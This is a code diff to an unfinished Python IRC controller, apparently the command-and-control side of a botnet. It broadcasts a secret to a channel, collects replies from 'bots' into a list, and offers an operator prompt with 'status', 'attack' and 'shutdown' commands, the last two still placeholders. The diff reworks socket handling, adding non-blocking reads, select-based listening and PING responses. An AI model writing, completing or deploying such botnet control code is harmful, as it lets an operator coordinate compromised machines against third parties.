@@ -5,7 +5,8 @@ import socket
 import random
 import string
 import time
-from datetime import timedelta, datetime
+import threading
+import select
 
 class PyBotCon:
 # NOTES --> Have to thread a listener into this program to listen for responses in a while(True) loop
@@ -30,6 +31,7 @@ class PyBotCon:
     try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
       self.ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       self.ircsock.connect((host,int(port)))
+      self.ircsock.setblocking(0)
       self.ircsock.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
       self.ircsock.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
     except:
@@ -47,7 +49,7 @@ class PyBotCon:
 
   def joinChan(self):
     self.ircsock.send(bytes("JOIN "+self.channel+"\n", "UTF-8"))
-    return
+#    return
 #    msg=""
 #    while msg.find("End of /NAMES list.") == -1:
 #      msg = self.ircsock.recv(2048).decode("UTF-8")
@@ -55,10 +57,26 @@ class PyBotCon:
 
   def conMain(self):
     while(True):
+      data = ""
+      data = self.ircsock.recv(1024).decode("UTF-8")
+      data = data.strip("\n\r")
+      dataLen = len(data.split()) #Split on white space
+
+      if dataLen == 2 and data.split()[0] == "PING":
+        print("DEBUG --> data recieved: PING REQUEST")
+        self.ping()
+#      elif dataLen >= 4 and data.split()[1] == "PRIVMSG": 
+#        print("DEBUG --> PRIVMSG/data recieved: ")
+#        senderDetails = data.split()[0].split(":")[1]
+#        senderNick = senderDetails.split("!")[0]
+#        channelOrUser = data.split()[2]   # THIS VARIABLE TELLS IF MESSAGE WAS sent publicly (#Channel), or private message (Our Nick)
+#        temp = data.split("PRIVMSG")[1].split(":")
+#        senderMessage = temp[1]
+
       print("command> ",end='')
       command = input()
       if(command == "status"):
-        self.identifyBots()
+#        self.identifyBots()
         print(str(len(self.botList))+" bots found: " + str(self.botList))
       elif(command.startswith("attack")):
         # NOTE --> Need to create a function for sending the attack command
@@ -73,13 +91,6 @@ class PyBotCon:
       elif(command=="shutdown"):
         sys.exit("Not Implemented")
         # Need to create a function for sending shutdown message to the channel
-      data = ""
-      data = self.ircsock.recv(4096).decode("UTF-8")
-      data = data.strip("\n\r")
-      print("DEBUG --> data recieved: " + data)
-
-      if data.find("PING :") != -1:  #Respond to server pings (keep alive)
-        self.ping()
 
   def ping(self):
     self.ircsock.send(bytes("PONG :pingis\n","UTF-8"))
@@ -116,16 +127,21 @@ class PyBotCon:
     # Send 'hello' message for bots to identify themselves
     self.ircsock.send(bytes("PRIVMSG " + self.channel + " " + self.secret + "\n","UTF-8")) 
     self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
-    time.sleep(6)
-#    period = timedelta(seconds=5)
-#    endLoop = datetime.now() + period
-    while self.ircsock.recv(2048) != None:
+    self.ircsock.setblocking(0)
+    time.sleep(10)
+    read, _, _ = select.select([self.ircsock],[],[],5)
+    while read[0]!= None:
 # NOTE --> I'm not sure how I should be listening for bot replies, this will need to be adjusted
       data = self.ircsock.recv(2048).decode("UTF-8")
-      data = data.strip("\r\n")
-      if(data.find(".tell")!=-1 and data.split("PRIVMSG",1)[1].split(":",1)[1]=="YOURS"): # NOTE --> The response message that we're expecting from bots is "YOURS"
-        temp = data.split("BotName$$: ")[1][0:7] # Finds name of the bot reply
-        self.botList.append(temp) # Adds the name of the bot reply to botList
+      data = data.strip("\n\r")
+      dataLen = len(data.split())
+      if(data.split()[1]=="PRIVMSG" and data.split("PRIVMSG",1)[1].split(":",1)[1].startswith("BotName$$: ")): # NOTE --> The response message that we're expecting from bots is "YOURS"
+        temp = data.split("PRIVMSG",1)[1].split(":",1)[1] # Finds name of the bot reply
+        print("DEBUG --> Bot name found:" + temp)
+        self.botList.append(temp[11:]) # Adds the name of the bot reply to botList
+      elif dataLen == 2 and data.split()[0] == "PING":
+        print("DEBUG --> data recieved: PING REQUEST")
+        self.ping()
     return
 
 
